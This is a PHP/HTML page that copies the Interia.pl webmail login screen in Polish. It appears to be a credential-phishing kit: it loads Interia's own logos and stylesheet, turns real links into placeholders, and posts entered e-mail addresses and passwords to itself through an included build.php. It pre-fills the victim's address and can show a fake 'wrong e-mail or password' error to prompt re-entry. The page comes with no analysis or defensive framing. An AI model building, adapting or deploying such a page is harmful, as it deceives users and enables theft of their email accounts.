<?php include '../build.php' ?>
<html lang="pl" class="font-default"><head>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <title>Poczta w Interia.pl - darmowa poczta e-mail – logowanie do konta</title>
    <meta name="description" content="Dołącz do użytkowników Poczty w Interia.pl. Ciesz się nieograniczoną pojemnością, dużymi załącznikami i błyskawicznym działaniem. Bezpieczne i darmowe konto email czeka na Ciebie!">

    <link rel="stylesheet" type="text/css" id="main-style" href="https://poczta.interia.pl/logowanie/public/main.202606301215.css">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="initial-scale=1,maximum-scale=1,width=device-width,user-scalable=no">
    <link rel="shortcut icon" href="https://poczta.interia.pl/public/favicon.ico">
    <style>
        body, html {
            color: #090947;
            font-family: Roboto, Arial, sans-serif;
            margin: 0;
            min-width: 320px;
            padding: 0;
        }

        html.font-default {
            font-size: 14px;
        }

        @media (min-width: 1025px) {
            .form__error {
                margin-bottom: 16px;
                margin-top: -8px;
            }
        }

        .form__error {
            color: #ff0303;
            font-size: 1.143rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        /*
        .login-form .nxt-input-containers {
            height: auto !important;
            margin-bottom: 20px !important;
        }
            */
        .login-form .nxt-input-containers .login-form__password-input.nxt-input {
            padding-right: 25px;
        }

        .login-form .nxt-input-container .nxt-input {
            transform: translateY(10px) !important;
        }

        .nxt-input-containers .nxt-input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background: none;
            border: none;
            border-radius: 0;
            color: #2a2d34;
            font-family: "Roboto", sans-serif;
            font-size: 1.143rem;
            font-weight: 500;
            height: 100%;
            padding: 0;
            vertical-align: top;
            width: 100%;
        }

        .nxt-input-containers {
            font-size: 1.143rem;
            height: 40px;
            line-height: 4.12;
            margin-bottom: 30px;
            position: relative;
        }

        .login-form__input {
            position: relative;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-direction: column;
            flex-direction: column;
            row-gap: 1.88rem;
        }

        .nxt-input-containers .nxt-input-line {
            background-color: #707070;
            border: 0;
            height: 1px;
            margin: -8px 0px 0px;
            overflow-x: hidden;
            position: absolute;
            width: 100%;
        }

        .nxt-input-containers .nxt-input-placeholders {
            color: #767676;
            cursor: text;
            font-size: 14px;
            font-weight: 400;
            left: 0;
            position: absolute;
            top: 15px;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }
    </style>
</head>
<body><div id="icons"><svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<symbol id="icon-refresh" viewBox="0 0 32 32">
<path d="M24.5 15.64c-0.276 0-0.5 0.224-0.5 0.5v0c0 4.418-3.582 8-8 8s-8-3.582-8-8c0-4.418 3.582-8 8-8v0c0.003 0 0.007 0 0.012 0 1.747 0 3.362 0.566 4.671 1.526l-0.022-0.015h-1.73c-0.276 0-0.5 0.224-0.5 0.5v0c0 0.276 0.224 0.5 0.5 0.5v0h3.070c0.276 0 0.5-0.224 0.5-0.5v0-2.79c0-0.276-0.224-0.5-0.5-0.5v0c-0.276 0-0.5 0.224-0.5 0.5v0 1.64c-1.491-1.16-3.39-1.86-5.452-1.86-0.017 0-0.034 0-0.051 0h0.003c-4.971 0-9 4.029-9 9s4.029 9 9 9c4.971 0 9-4.029 9-9v0c0-0.276-0.224-0.5-0.5-0.5v0z"></path>
</symbol>
<symbol id="icon-important-circle" viewBox="0 0 32 32">
<path d="M16 5.333c-5.891 0-10.667 4.776-10.667 10.667s4.776 10.667 10.667 10.667c5.891 0 10.667-4.776 10.667-10.667v0c0-5.891-4.776-10.667-10.667-10.667v0zM16 26c-5.523 0-10-4.477-10-10s4.477-10 10-10c5.523 0 10 4.477 10 10v0c0 5.523-4.477 10-10 10v0z"></path>
<path d="M16 8.103c-1.437 0.050-1.947 1.053-1.947 2l0.54 7.643c-0 0.003-0 0.008-0 0.012 0 0.782 0.634 1.417 1.417 1.417 0.778 0 1.41-0.628 1.417-1.404v-0.001l0.54-7.69c-0.010-0.923-0.52-1.927-1.967-1.977zM16.76 17.747c-0.007 0.409-0.34 0.738-0.75 0.738-0.414 0-0.75-0.336-0.75-0.75 0-0.004 0-0.008 0-0.012v0.001l-0.55-7.643c-0.003-0.034-0.005-0.074-0.005-0.114 0-0.663 0.537-1.2 1.2-1.2 0.034 0 0.067 0.001 0.1 0.004l-0.004-0c1.133 0.040 1.3 0.837 1.303 1.287z"></path>
<path d="M16 20.813c-0.001 0-0.002 0-0.003 0-0.852 0-1.543 0.691-1.543 1.543s0.691 1.543 1.543 1.543c0.852 0 1.543-0.691 1.543-1.543v0c0 0 0 0 0 0 0-0.851-0.689-1.541-1.54-1.543h-0zM16 23.23c-0.001 0-0.002 0-0.003 0-0.484 0-0.877-0.392-0.877-0.877s0.393-0.877 0.877-0.877c0.484 0 0.877 0.392 0.877 0.877 0 0.001 0 0.002 0 0.003v-0c0 0.482-0.391 0.873-0.873 0.873v0z"></path>
</symbol>
<symbol id="icon-dialog-shield" viewBox="0 0 32 32">
<path d="M16 26.639c-0 0-0 0-0 0-0.082 0-0.157-0.029-0.215-0.079l0.001 0.001-4.991-4.192c-2.109-1.774-3.44-4.414-3.44-7.365 0-0.001 0-0.001 0-0.002v0-6.982c0-0 0-0 0-0 0-0.167 0.123-0.305 0.283-0.329l0.002-0c3.075-0.463 5.843-1.266 8.442-2.385l-0.221 0.085c0.041-0.019 0.088-0.030 0.137-0.030s0.097 0.011 0.14 0.031l-0.002-0.001c2.379 1.035 5.147 1.838 8.033 2.277l0.188 0.023c0.162 0.024 0.285 0.162 0.285 0.329 0 0 0 0 0 0v0 6.982c0 0.001 0 0.001 0 0.002 0 2.951-1.331 5.591-3.425 7.353l-0.015 0.012-4.991 4.192c-0.057 0.049-0.132 0.078-0.214 0.078-0 0-0 0-0 0v0zM8.021 8.307v6.695c0 0.001 0 0.001 0 0.001 0 2.747 1.239 5.205 3.189 6.846l0.013 0.011 4.777 4.012 4.777-4.012c1.964-1.651 3.203-4.109 3.203-6.857 0-0.001 0-0.001 0-0.001v0-6.695c-2.995-0.481-5.679-1.265-8.209-2.338l0.23 0.087c-2.301 0.987-4.984 1.771-7.777 2.225l-0.202 0.027z"></path>
<path d="M10.015 12.675c-0 0-0 0-0 0-0.183 0-0.332-0.149-0.332-0.332 0-0 0-0 0-0v0-2.367c0-0.16 0.113-0.293 0.263-0.325l0.002-0.001c0.648-0.133 1.313-0.289 1.977-0.465 0.025-0.007 0.055-0.011 0.085-0.011 0.183 0 0.333 0.149 0.333 0.333 0 0.153-0.104 0.283-0.245 0.321l-0.003 0.001c-0.585 0.155-1.172 0.295-1.747 0.418v2.097c0 0 0 0 0 0 0 0.183-0.149 0.332-0.332 0.332-0 0-0 0-0 0v0z"></path>
</symbol>
<symbol id="icon-close" viewBox="0 0 32 32">
<path d="M31.319-0.007c-0.181 0.006-0.342 0.082-0.459 0.202l-0 0-30.665 30.666c-0.121 0.121-0.196 0.288-0.196 0.472 0 0.368 0.299 0.667 0.667 0.667 0.184 0 0.351-0.075 0.471-0.195v0l30.666-30.667c0.125-0.121 0.202-0.291 0.202-0.478 0-0.368-0.299-0.667-0.667-0.667-0.007 0-0.014 0-0.021 0l0.001-0z"></path>
<path d="M0.66-0.006c-0 0-0 0-0 0-0.368 0-0.667 0.298-0.667 0.667 0 0.187 0.077 0.357 0.202 0.478l30.666 30.666c0.121 0.121 0.288 0.195 0.472 0.195 0.369 0 0.667-0.299 0.667-0.667 0-0.184-0.075-0.351-0.195-0.472l-30.667-30.666c-0.121-0.124-0.29-0.201-0.477-0.201-0 0-0 0-0 0v0z"></path>
</symbol>
<symbol id="icon-select" viewBox="0 0 32 32">
<path d="M29.095 7.271l-13.093 12.085-13.091-12.085-2.911 2.815 16.003 14.642 16.003-14.642z"></path>
</symbol>
<symbol id="icon-trusted" viewBox="0 0 32 32">
<path d="M31.696 8.193l-18.935 18.807-12.456-12.085 3.12-3.216 9.191 8.917 15.936-15.615 3.145 3.193z"></path>
</symbol>
<symbol id="icon-hide-pass" viewBox="0 0 42 32">
<path d="M20.923 2.002c-8.077 0.322-15.518 4.47-20.041 11.169-0.425 0.571-0.425 1.353 0 1.924 4.519 6.704 11.962 10.855 20.041 11.177 8.077-0.322 15.518-4.47 20.041-11.169 0.425-0.571 0.425-1.353 0-1.924-4.519-6.705-11.962-10.855-20.041-11.177zM21.48 22.684c-4.719 0.308-8.795-3.269-9.102-7.988s3.269-8.795 7.988-9.102c4.719-0.308 8.795 3.269 9.102 7.988 0.025 0.371 0.025 0.743 0 1.114-0.282 4.29-3.698 7.707-7.988 7.988zM21.226 18.737c-2.541 0.163-4.734-1.764-4.898-4.306s1.764-4.734 4.306-4.898c2.541-0.163 4.734 1.764 4.898 4.306 0.013 0.197 0.013 0.395 0 0.592-0.147 2.315-1.993 4.16-4.309 4.304l0.002 0.002z"></path>
<path stroke-linejoin="miter" stroke-linecap="butt" stroke-miterlimit="4" stroke-width="0.7385" d="M34.734 0.916c-0.245-0.246-0.643-0.247-0.889-0.002-0 0-0.001 0.002-0.002 0.002l-29.279 29.279c-0.246 0.246-0.246 0.645 0 0.891s0.645 0.246 0.891 0l29.279-29.269c0.248-0.242 0.254-0.64 0.012-0.889-0.004-0.004-0.008-0.008-0.012-0.012z"></path>
</symbol>
<symbol id="icon-show-pass" viewBox="0 0 42 32">
<path d="M21.24 1.947c-8.16 0.325-15.677 4.515-20.246 11.284-0.429 0.577-0.429 1.367 0 1.943 4.565 6.773 12.084 10.966 20.246 11.291 8.16-0.325 15.677-4.515 20.246-11.284 0.429-0.577 0.429-1.367 0-1.943-4.565-6.773-12.084-10.966-20.246-11.291zM21.803 22.841c-4.768 0.311-8.885-3.302-9.195-8.070s3.302-8.885 8.070-9.195c4.768-0.311 8.885 3.302 9.195 8.070 0.024 0.375 0.024 0.751 0 1.125-0.285 4.333-3.736 7.785-8.070 8.070zM21.546 18.853c-2.567 0.165-4.783-1.782-4.948-4.35s1.783-4.783 4.35-4.948c2.567-0.165 4.783 1.783 4.948 4.35 0.013 0.199 0.013 0.399 0 0.598-0.148 2.339-2.014 4.202-4.352 4.347l0.003 0.003z"></path>
</symbol>
<symbol id="icon-checkmark" viewBox="0 0 32 32">
<path d="M27 4l-15 15-7-7-5 5 12 12 20-20z"></path>
</symbol>
<symbol id="icon-tick" viewBox="0 0 32 32">
<path d="M23.609 10.431c0.521 0.521 0.521 1.365 0 1.886l-9.187 9.188c-0.602 0.602-1.576 0.6-2.176 0.001l-3.855-3.855c-0.521-0.521-0.521-1.365-0-1.886s1.365-0.521 1.886-0l3.057 3.057 8.39-8.391c0.521-0.521 1.365-0.521 1.886-0z"></path>
</symbol>
<symbol id="icon-arrow" viewBox="0 0 34 32">
<path d="M11.61 13.189c0.547-0.518 1.433-0.518 1.98 0l3.21 3.042 3.21-3.042c0.547-0.518 1.433-0.518 1.98 0s0.547 1.358 0 1.876l-3.78 3.582c-0.779 0.738-2.042 0.738-2.821 0l-3.78-3.582c-0.547-0.518-0.547-1.358 0-1.876z"></path>
</symbol>
<symbol id="icon-accessibility" viewBox="0 0 26 32">
<path d="M13 5.333c-0.733 0-1.361-0.261-1.883-0.783s-0.783-1.15-0.783-1.883c0-0.733 0.261-1.361 0.783-1.883s1.15-0.783 1.883-0.783c0.733 0 1.361 0.261 1.883 0.783s0.783 1.15 0.783 1.883c0 0.733-0.261 1.361-0.783 1.883s-1.15 0.783-1.883 0.783zM9 25.333v-16c-1.333-0.111-2.689-0.278-4.067-0.5s-2.689-0.5-3.933-0.833l0.667-2.667c1.733 0.467 3.578 0.806 5.533 1.017s3.889 0.317 5.8 0.317c1.911 0 3.844-0.106 5.8-0.317s3.8-0.55 5.534-1.017l0.666 2.667c-1.244 0.333-2.556 0.611-3.933 0.833s-2.733 0.389-4.066 0.5v16h-2.667v-8h-2.667v8h-2.667zM7.667 32c-0.378 0-0.694-0.128-0.95-0.383s-0.383-0.572-0.383-0.95 0.128-0.694 0.383-0.95c0.256-0.255 0.572-0.383 0.95-0.383s0.694 0.128 0.95 0.383c0.256 0.256 0.383 0.572 0.383 0.95s-0.128 0.695-0.383 0.95c-0.256 0.256-0.572 0.383-0.95 0.383zM13 32c-0.378 0-0.694-0.128-0.95-0.383s-0.383-0.572-0.383-0.95 0.128-0.694 0.383-0.95c0.256-0.255 0.572-0.383 0.95-0.383s0.694 0.128 0.95 0.383c0.256 0.256 0.383 0.572 0.383 0.95s-0.128 0.695-0.383 0.95c-0.256 0.256-0.572 0.383-0.95 0.383zM18.333 32c-0.378 0-0.694-0.128-0.95-0.383s-0.383-0.572-0.383-0.95 0.128-0.694 0.383-0.95c0.256-0.255 0.572-0.383 0.95-0.383s0.694 0.128 0.95 0.383c0.256 0.256 0.383 0.572 0.383 0.95s-0.128 0.695-0.383 0.95c-0.256 0.256-0.572 0.383-0.95 0.383z"></path>
</symbol>
</defs>
</svg>
</div>
    
    <div id="main-app" class="main-app"><header class="header-container"><div class="container-interia"><a href="#" class="container-interia-logo"><img alt="Logo Interia" src="https://poczta.interia.pl/logowanie/public/img/header/interia-logo.svg"></a><a href="#" class="container-interia-poczta"><img alt="Logo Interia Poczta" src="https://poczta.interia.pl/logowanie/public/img/header/poczta-logo.svg"></a></div><div class="container-right"><button class="container-store">Otwórz aplikację</button><div class="ap-wrapper"><button type="button" class="ap-icon-button"><svg class="icon-svg icon-svg-accessibility ap-icon-button__icon" height="20" width="20" style="min-width: 20px; min-height: 20px;"><use xlink:href="#icon-accessibility"></use></svg><svg class="icon-svg icon-svg-arrow ap-icon-button__icon " height="20" width="20" style="min-width: 20px; min-height: 20px;"><use xlink:href="#icon-arrow"></use></svg></button></div></div></header><div class="main-container"><div class="form" id="sitebar"><form class="login-form" method="POST" action="" novalidate=""><h1 class="form__title standard-common-logo">Logowanie</h1><div class="form__header"><div class="form__header-logo"><div class="logo"><a href="#" class="logo--interia"><img alt="Logo Interia" src="https://poczta.interia.pl/logowanie/public/img/header/interia-logo.svg"></a><a href="#" class="logo--poczta"><img alt="Logo Interia Poczta" src="https://poczta.interia.pl/logowanie/public/img/header/poczta-logo.svg"></a></div></div><div class="ap-wrapper"><button type="button" class="ap-icon-button"><svg class="icon-svg icon-svg-accessibility ap-icon-button__icon" height="20" width="20" style="min-width: 20px; min-height: 20px;"><use xlink:href="#icon-accessibility"></use></svg><svg class="icon-svg icon-svg-arrow ap-icon-button__icon " height="20" width="20" style="min-width: 20px; min-height: 20px;"><use xlink:href="#icon-arrow"></use></svg></button></div></div>
    <span class="form__error" style="<?php echo $error; ?>">Błędny e-mail lub hasło</span>    
    <div class="login-form__input"><div class="nxt-input-containers nxt-input-container--touched"><input class="login-form__email-input nxt-input" name="user" id="email" type="text" autocomplete="username" value="<?php echo htmlspecialchars($decoded); ?>"><label class="nxt-input-placeholders" for="email">E-mail </label><hr class="nxt-input-line"></div><div class="login-form__password-wrapper"><div class="nxt-input-containers"><input class="login-form__password-input nxt-input" name="pass" id="password" type="text" autocomplete="current-password" value=""><label class="nxt-input-placeholders" for="password">Hasło </label><hr class="nxt-input-line"></div><button class="login-form__password-button" title="Pokaż hasło" type="button"><svg class="icon-svg icon-svg-hide-pass login-form__password-icon" height="16" width="16" style="min-width: 16px; min-height: 16px;"><use xlink:href="#icon-hide-pass"></use></svg></button></div><div class="hidden-container"><div class="nxt-input-containers"><label class="nxt-input-placeholders" for="captchaRes"> </label><hr class="nxt-input-line"></div></div><input type="hidden" name="login" value="interia"></div><div class="options"><div class="nxt-input-checkbox-rhf"><input class="nxt-input-checkbox-rhf__input" id="rememberMe" name="rememberMe" type="checkbox"><label class="nxt-input-checkbox-rhf__label" for="rememberMe">Zapamiętaj mnie</label></div><div class="options__help"><a class="options__help__password" href="#">Odzyskaj hasło</a><span class="options__help__separator"></span><a class="options__help__support" href="#">Pomoc</a></div></div><div class="form__buttons"><button class="nxt-main-button nxt-main-button--primary nxt-main-button--large btn btn--login" type="submit">Zaloguj się</button><span class="no-account">Nie masz jeszcze konta?</span><a href="#" class="btn btn--bordered">Załóż konto</a></div><div class="copyright">Copyright &copy; 1999-2026<a class="link" href="#"> INTERIA.PL </a><br>Wszystkie prawa zastrzeżone. Korzystanie z portalu oznacza akceptację<br><a class="link" href="#"> Regulaminu</a>. <a class="link" href="#">Polityka&nbsp;Cookies</a>. <a class="link" href="#">Prywatność</a>. <button class="link">Ustawienia&nbsp;Preferencji</button>.</div></form></div><div class="border"></div><div class="ad-box"><div class="ad-box__container" id="box600x450"></div></div></div></div>
    </body>
	</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
